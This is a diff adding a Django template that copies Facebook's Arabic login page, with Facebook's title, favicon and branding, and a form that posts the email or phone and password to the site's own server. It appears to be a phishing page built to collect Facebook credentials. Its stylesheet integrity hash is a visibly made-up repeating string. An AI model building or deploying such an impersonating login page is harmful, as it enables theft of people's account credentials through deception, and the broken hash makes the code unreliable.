@@ -1,0 +1,51 @@
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form method="post">
+        {% csrf_token %}
+        <input type="text" name="username" placeholder="اسم المستخدم">
+        <input type="password" name="password" placeholder="كلمة المرور">
+        <button type="submit">تسجيل الدخول</button>
+      </form>
+      
+</body>
+</html> -->
+{% load static %}
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+  <link rel="stylesheet" href="{% static 'css/styles.css' %}"/>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOM8b+z4+2e5c7e5a5e5c7e5a5e5c7e5a5e5c7e" crossorigin="anonymous">
+
+</head>
+<body>
+  <div class="container">
+    <div class="form-container">
+        <form method="post">
+            {% csrf_token %}
+            <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف">
+            <input type="password" name="password" placeholder="كلمة السر">
+            <button class="login-btn">تسجيل الدخول</button>
+            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+            <hr>
+            <button class="create-account-btn">إنشاء حساب جديد</button>
+        </form>
+    </div>
+    <div class="info-container">
+      <h1>facebook</h1>
+      <p>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+    </div>
+  </div>
+</body>
+
+</html>
